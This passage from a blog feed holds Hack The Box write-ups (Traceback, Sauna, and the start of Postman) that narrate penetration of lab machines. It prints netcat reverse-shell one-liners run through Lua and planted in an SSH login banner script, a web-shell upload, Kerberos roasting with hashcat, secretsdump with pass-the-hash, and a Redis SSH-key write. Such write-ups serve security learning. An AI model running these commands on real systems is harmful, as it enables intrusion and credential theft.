&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-03-17 21:42 EDT
&lt;&#x2F;span&gt;&lt;span&gt;Failed to resolve &amp;quot;nmap&amp;quot;.
&lt;&#x2F;span&gt;&lt;span&gt;Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
&lt;&#x2F;span&gt;&lt;span&gt;Service scan Timing: About 50.00% done; ETC: 21:42 (0:00:06 remaining)
&lt;&#x2F;span&gt;&lt;span&gt;Nmap scan report for 10.10.10.181
&lt;&#x2F;span&gt;&lt;span&gt;Host is up (0.032s latency).
&lt;&#x2F;span&gt;&lt;span&gt;Not shown: 998 closed ports
&lt;&#x2F;span&gt;&lt;span&gt;PORT   STATE SERVICE VERSION
&lt;&#x2F;span&gt;&lt;span&gt;22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
&lt;&#x2F;span&gt;&lt;span&gt;| ssh-hostkey: 
&lt;&#x2F;span&gt;&lt;span&gt;|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
&lt;&#x2F;span&gt;&lt;span&gt;|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
&lt;&#x2F;span&gt;&lt;span&gt;|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
&lt;&#x2F;span&gt;&lt;span&gt;80&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
&lt;&#x2F;span&gt;&lt;span&gt;|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)
&lt;&#x2F;span&gt;&lt;span&gt;|_http-title: Help us                                                         
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Enumeration of port 80 shows a single page. I began running &lt;code&gt;gobuster&lt;&#x2F;code&gt; and &lt;code&gt;nikto&lt;&#x2F;code&gt; but no results.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-traceback&#x2F;htb-traceback-1.png&quot; alt=&quot;htb-traceback-1.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;In the source page, there is a line that mentions:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;lt;!--Some of the best web shells that you might need ;)--&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Google shows up with a repository that contains many web shells.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;https:&#x2F;&#x2F;github.com&#x2F;TheBinitGhimire&#x2F;Web-Shells
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;I tried the entire list of filenames and smevk.php worked.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;http:&#x2F;&#x2F;traceback&#x2F;smevk.php
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-traceback&#x2F;htb-traceback-2.png&quot; alt=&quot;htb-traceback-2.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I basically guessed admin:admin and it worked.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-traceback&#x2F;htb-traceback-3.png&quot; alt=&quot;htb-traceback-3.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;After playing around with the web shell and understanding the capabilities, there was a file manager that can be utilized to upload a reverse shell script. I Googled for a PHP reverse shell and came upon the gold standard of PHP scripts:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;pentestmonkey&#x2F;php-reverse-shell&#x2F;master&#x2F;php-reverse-shell.php
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Once it was uploaded, it was a matter of executing the script by navigating the URL:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;http:&#x2F;&#x2F;traceback&#x2F;rs.php
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Now that I have a low privilege shell access, I began lurking around to see what I can find. I noticed there was a note.txt file in the &lt;code&gt;&#x2F;home&#x2F;webadmin&#x2F;&lt;&#x2F;code&gt; directory.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-traceback&#x2F;htb-traceback-4.png&quot; alt=&quot;htb-traceback-4.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I took a look at the &lt;code&gt;.bash_history&lt;&#x2F;code&gt; file to see if there were past commands that would assist with privilege escalation.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-traceback&#x2F;htb-traceback-5.png&quot; alt=&quot;htb-traceback-5.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The &lt;code&gt;sudo&lt;&#x2F;code&gt; command is definitely not right so I looked into the current privileges I had with &lt;code&gt;webadmin&lt;&#x2F;code&gt; account.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-traceback&#x2F;htb-traceback-6.png&quot; alt=&quot;htb-traceback-6.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Knowing what privileges I had, I knew what I had to do going forward. I Googled for a way to execute operating system commands in LUA language to create a reverse shell connection. I Googled for an LUA based reverse shell and combined with a bourne reverse shell one liner.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;require(&amp;#39;os&amp;#39;);
&lt;&#x2F;span&gt;&lt;span&gt;os.execute(&amp;#39;sh -c rm &#x2F;tmp&#x2F;abc;mkfifo &#x2F;tmp&#x2F;abc;cat &#x2F;tmp&#x2F;abc|&#x2F;bin&#x2F;sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.45 4445 &amp;gt;&#x2F;tmp&#x2F;abc&amp;#39;);
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-traceback&#x2F;htb-traceback-7.png&quot; alt=&quot;htb-traceback-7.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Setup a netcat listener and execute the &lt;code&gt;sudo&lt;&#x2F;code&gt; command. User flag has been obtained.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;sudo -u sysadmin &#x2F;home&#x2F;sysadmin&#x2F;luvit privesc.lua
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-traceback&#x2F;htb-traceback-8.png&quot; alt=&quot;htb-traceback-8.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-traceback&#x2F;htb-traceback-9.png&quot; alt=&quot;htb-traceback-9.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h3 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;&#x2F;h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;As a convenience for myself, I added my own SSH key to the &lt;code&gt;authorized_keys&lt;&#x2F;code&gt; file so I can easily SSH into the machine and have a proper shell.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-traceback&#x2F;htb-traceback-10.png&quot; alt=&quot;htb-traceback-10.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;ssh -i ~&#x2F;.ssh&#x2F;id_rsa sysadmin@traceback
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;I ran the standard linux enumeration scripts, &lt;code&gt;Linpeas&lt;&#x2F;code&gt; and &lt;code&gt;PSPY64&lt;&#x2F;code&gt;. The &lt;code&gt;Linpeas&lt;&#x2F;code&gt; results showed a lot of interesting results but didn&#x27;t notice anything too interesting until I ran &lt;code&gt;PSPY64&lt;&#x2F;code&gt;. &lt;code&gt;PSPY64&lt;&#x2F;code&gt; found a &lt;code&gt;cron&lt;&#x2F;code&gt; job that was running every 30 seconds or so and was related to MOTD. Once I noticed these processes, I figured it was related to some kind of MOTD abuse.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-traceback&#x2F;htb-traceback-11.png&quot; alt=&quot;htb-traceback-11.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-traceback&#x2F;htb-traceback-12.png&quot; alt=&quot;htb-traceback-12.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-traceback&#x2F;htb-traceback-13.png&quot; alt=&quot;htb-traceback-13.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;Linpeas&lt;&#x2F;code&gt; show that &lt;code&gt;sysadmin&lt;&#x2F;code&gt; had access to modify &lt;code&gt;00-header&lt;&#x2F;code&gt; file which controls the MOTD when you log in via SSH. I decided to insert the reverse shell one liner that I did before. Next time when I logged into SSH, the machine should execute the MOTD file along with my command. Root flag has been obtained.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;sh -c rm &#x2F;tmp&#x2F;abc;mkfifo &#x2F;tmp&#x2F;abc;cat &#x2F;tmp&#x2F;abc|&#x2F;bin&#x2F;sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.45 4446 &amp;gt;&#x2F;tmp&#x2F;abc&amp;#39;);
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-traceback&#x2F;htb-traceback-14.png&quot; alt=&quot;htb-traceback-14.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-traceback&#x2F;htb-traceback-15.png&quot; alt=&quot;htb-traceback-15.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Sauna</title>
        <published>2020-03-16T00:00:00+00:00</published>
        <updated>2020-03-16T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/htb-sauna/" type="text/html"/>
        <id>https://johntuyen.com/posts/htb-sauna/</id>
        
        <content type="html">&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;nmap&lt;&#x2F;code&gt; scans show ports 80, 135, 53, and 389 are opened.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;I started with enumerating the SMB shares and see if anything would show up. Unfortunately, there wasn&#x27;t any accessible shares.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-sauna&#x2F;htb-sauna-smbmap.png&quot; alt=&quot;htb-sauna-smbmap.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Next service to be enumerated is DNS and see if I could get any zone transfers by guessing or PTR records. Again, there wasn&#x27;t any DNS records that can be found.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-sauna&#x2F;htb-sauna-dig.png&quot; alt=&quot;htb-sauna-dig.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Next service to be enumerated is LDAP using &lt;code&gt;ldapsearch&lt;&#x2F;code&gt;. I did find up finding a username &amp;quot;Hugo Smith&amp;quot;. I tried guessing the password to see if I would login but no luck.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-sauna&#x2F;htb-sauna-ldapsearch.png&quot; alt=&quot;htb-sauna-ldapsearch.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Next, I would proceed with the HTTP service. I found it was hosting a banking site called Egotistical Bank. Running &lt;code&gt;gobuster&lt;&#x2F;code&gt; in the background, I started to inspect the site code and eventually I found this page that could be in use for enumerating possible usernames.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-sauna&#x2F;htb-sauna-httpserver.png&quot; alt=&quot;htb-sauna-httpserver.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;I started to compile a list of possible usernames that most companies would use such as:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;hsmith&lt;&#x2F;li&gt;
&lt;li&gt;hugos&lt;&#x2F;li&gt;
&lt;li&gt;hugosmith&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;I used a tool called &lt;code&gt;kerbrute&lt;&#x2F;code&gt; python script to help enumerate the list of users that I created to validate the possible usernames. As you can see, it validated the user &lt;code&gt;hsmith&lt;&#x2F;code&gt;. Eventually I created the other possible users listed on the website and enumerated again. The second user found was &lt;code&gt;fsmith&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-sauna&#x2F;htb-sauna-kerbrute.png&quot; alt=&quot;htb-sauna-kerbrute.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Using the Impacket script, &lt;code&gt;GetNPUsers.py&lt;&#x2F;code&gt;, I used &lt;code&gt;fsmith&lt;&#x2F;code&gt; username and see if the ASREPRoast attack would work on this account. This attack looks for users without required Kerberos pre-authentication. The python script tries to harvest the non-preauth AS_REP responses for brute forcing. As you can see, an AS_REP response has been acquired.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-sauna&#x2F;htb-sauna-getnp.png&quot; alt=&quot;htb-sauna-getnp.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Using &lt;code&gt;hashcat&lt;&#x2F;code&gt;, I saved the AS_REP response hash to a file and proceeded to deploy brute force attack. The hash has been cracked.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;hashcat -m 18200 -a 0 ~&#x2F;Documents&#x2F;hackthebox&#x2F;sauna&#x2F;fsmith.txt &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt --force
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-sauna&#x2F;htb-sauna-hashcatfsmith.png&quot; alt=&quot;htb-sauna-hashcatfsmith.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;With this new username and password, the next logical step is trying to connect using WinRM using &lt;code&gt;evil-winrm&lt;&#x2F;code&gt;. Once connected, I was able to obtain user.txt flag.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-sauna&#x2F;htb-sauna-winrm.png&quot; alt=&quot;htb-sauna-winrm.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h3 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;&#x2F;h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;I began enumerating the Windows machines using &lt;code&gt;Winpeas&lt;&#x2F;code&gt;. It immediately found AutoLogon credentials in the registry for &lt;code&gt;svc_loanmgr&lt;&#x2F;code&gt;. You can also find this registry manually using a command. Using this newly found username and password, I used &lt;code&gt;evil-winrm&lt;&#x2F;code&gt; to login.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-sauna&#x2F;htb-sauna-winpeas.png&quot; alt=&quot;htb-sauna-winpeas.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-sauna&#x2F;htb-sauna-registry.png&quot; alt=&quot;htb-sauna-registry.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Enumerating the system even further didn&#x27;t find anything too obvious so tried to get the TGT ticket of other possible accounts but I ran into clock skew errors.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-sauna&#x2F;htb-sauna-gettgt.png&quot; alt=&quot;htb-sauna-gettgt.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;I had to remove &lt;code&gt;ntp&lt;&#x2F;code&gt; command from my system because it was conflicting with &lt;code&gt;timesyncd&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;apt purge ntp
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Once &lt;code&gt;ntp&lt;&#x2F;code&gt; has been removed, I reconfigured my &lt;code&gt;timesyncd.conf&lt;&#x2F;code&gt; file to sync with Sauna.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;sudo vim &#x2F;etc&#x2F;systemd&#x2F;timesyncd.conf
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;sudo systemctl restart systemd-timesyncd
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-sauna&#x2F;htb-sauna-ntpfix.png&quot; alt=&quot;htb-sauna-ntpfix.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-sauna&#x2F;htb-sauna-timesyncd.png&quot; alt=&quot;htb-sauna-timesyncd.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Once the clock skew errors has been resolved, I used &lt;code&gt;GetUserSPNs.py&lt;&#x2F;code&gt; script to deploy Kerberoasting attack and see if I could obtain any TGS tickets from other users. How kerberoasting attack work is attempting to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts. As you can see, &lt;code&gt;hsmith&lt;&#x2F;code&gt; TGS ticket has been obtained.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-sauna&#x2F;htb-sauna-getuserspn.png&quot; alt=&quot;htb-sauna-getuserspn.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-sauna&#x2F;htb-sauna-hsmith.png&quot; alt=&quot;htb-sauna-hsmith.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;I sent the TGS ticket to &lt;code&gt;hashcat&lt;&#x2F;code&gt; for brute forcing. The hash has been cracked and had the same password as &lt;code&gt;fsmith&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-sauna&#x2F;htb-sauna-hashcathsmith.png&quot; alt=&quot;htb-sauna-hashcathsmith.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;After spending some time poking around using the &lt;code&gt;hsmith&lt;&#x2F;code&gt; credentials and enumerate services with it, I didn&#x27;t find anything special about the account.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-sauna&#x2F;htb-sauna-otherremoteports.png&quot; alt=&quot;htb-sauna-otherremoteports.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;After digging further, I decided to see if I can dump the Administrator password using &lt;code&gt;secretsdump.py&lt;&#x2F;code&gt;. I got lucky. I sent the hash to &lt;code&gt;hashcat&lt;&#x2F;code&gt; and I was unable to crack the hash using &lt;code&gt;rockyou.txt&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-sauna&#x2F;htb-sauna-secretsdump.png&quot; alt=&quot;htb-sauna-secretsdump.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-sauna&#x2F;htb-sauna-hashcatadministrator.png&quot; alt=&quot;htb-sauna-hashcatadministrator.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Eventually, I was able to login as Administrator using &lt;code&gt;evil-winrm&lt;&#x2F;code&gt; using pass-the-hash technique. The root flag has been obtained.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-sauna&#x2F;htb-sauna-root.png&quot; alt=&quot;htb-sauna-root.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Postman</title>
        <published>2020-03-14T00:00:00+00:00</published>
        <updated>2020-03-14T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/htb-postman/" type="text/html"/>
        <id>https://johntuyen.com/posts/htb-postman/</id>
        
        <content type="html">&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;nmap&lt;&#x2F;code&gt; scans show ports 22, 80, 6379 (redis), and 10000 (webmin) are open.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Port 80 shows a web page that doesn&#x27;t show much information besides a basic page with static code.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-postman&#x2F;htb-postman-port80.png&quot; alt=&quot;htb-postman-port80.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Moving onto the next port 6379. It&#x27;s the default port that Redis service uses. Redis is a popular NoSQL database that operates using key and value store. To interface with Redis service, I will need to install &lt;code&gt;redis-tools&lt;&#x2F;code&gt; for the CLI tool.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Once &lt;code&gt;redis-tools&lt;&#x2F;code&gt; has been installed, time to interface with the redis server.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;redis-cli -h 10.10.10.160
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Checking to see if there are any useful keys value pairs with sensitive information but none was to be found. I figured at this point it&#x27;s probably some server side exploit to be found. Time to start Googling.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;I found a couple of exploits on Github that creates a Redis rouge server to run a MODULE command but I couldn&#x27;t get it working. After manually debugging the code, I finally realize the server doesn&#x27;t allow MODULE command to be executed. Time to move onto a simpler exploit.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;This &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Avinash-acid&#x2F;Redis-Server-Exploit&quot;&gt;Redis Server Exploit script&lt;&#x2F;a&gt; will fit the job. What this script does is it will manipulate the redis configuration value to upload a public key. It will create a private key on your local machine and append the new key to the redis configuration value using &lt;code&gt;redis-cli&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Here is the &lt;a href=&quot;https:&#x2F;&#x2F;maxchadwick.xyz&#x2F;blog&#x2F;ssrf-exploits-against-redis&quot;&gt;blog post&lt;&#x2F;a&gt; that will go through in detail on how it works.&lt;&#x2F;p&gt;
&lt;p&gt;The only problem with this script is I need to know the the name of a user on the server. We need this information so we could set the Redis’ dir to that user’s .ssh&#x2F; directory and set the &lt;code&gt;dbfilename&lt;&#x2F;code&gt; to authorized_keys. This is what happens if you run the script when don&#x27;t know what the username is:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-postman&#x2F;htb-postman-noperm.png&quot; alt=&quot;htb-postman-noperm.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Notice how it says &amp;quot;ERR changing directory: no such file or directory&amp;quot;. I need to find a writable location that the redis server has access. This is a trial and error process of figuring out what possible locations I could save my files.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-postman&#x2F;htb-postman-dir.png&quot; alt=&quot;htb-postman-dir.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;After Googling where redis server stores the database files (&#x2F;var&#x2F;lib&#x2F;redis), I&#x27;ve managed to succeed with finding write access. We just need to modify our script with the new path.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;cmd4 = cmd1 + &amp;#39; config set dir&amp;#39; + &amp;quot; &#x2F;var&#x2F;lib&#x2F;&amp;quot;+username+&amp;quot;&#x2F;.ssh&#x2F;&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
